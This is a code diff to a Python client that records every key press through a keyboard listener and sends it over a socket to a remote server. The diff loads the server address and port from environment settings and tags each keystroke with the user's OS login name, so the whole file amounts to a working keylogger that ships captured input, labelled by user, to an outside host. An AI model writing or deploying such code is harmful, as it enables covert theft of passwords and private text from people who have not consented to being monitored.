@@ -11,15 +11,22 @@ import os, sys
 
 import socket
 
+from dotenv import load_dotenv, dotenv_values
+
+load_dotenv()
+
 # socket constants
 HEADER = 8
-PORT = 9999
 FORMAT = 'utf-8'
 DISCONNECT_MESSAGE = '!d'
-# no static ip: add the ip manually
 # server's ip address
-SERVER = ''
+SERVER = os.getenv('SERVER')
+PORT = int(os.getenv('PORT'))
 ADDR = (SERVER, PORT)
+NAME_HEADER = '@@@'
+
+
+print(SERVER)
 
 # set up client socket
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -29,7 +36,7 @@ client.connect(ADDR)
 # function for sending key presses to the server
 # parameters: key - string
 def handleKeyPress(key):
-    msg_str = str(key)
+    msg_str = os.getlogin() + NAME_HEADER + str(key)
     # encoding the message with utf-8
     msg_encoded = msg_str.encode(FORMAT)
     # need to send header, so get length
@@ -47,11 +54,11 @@ def handleKeyPress(key):
 
 # function to set up the key listener 
 def listen():
-    #creating listener object
+    # creating listener object
     listener = keyboard.Listener(on_press=handleKeyPress)
     listener.start()
     print('[LISTENING] client is listening for input')
-    #getting input
+    # getting input
     input()
 
 # main execution
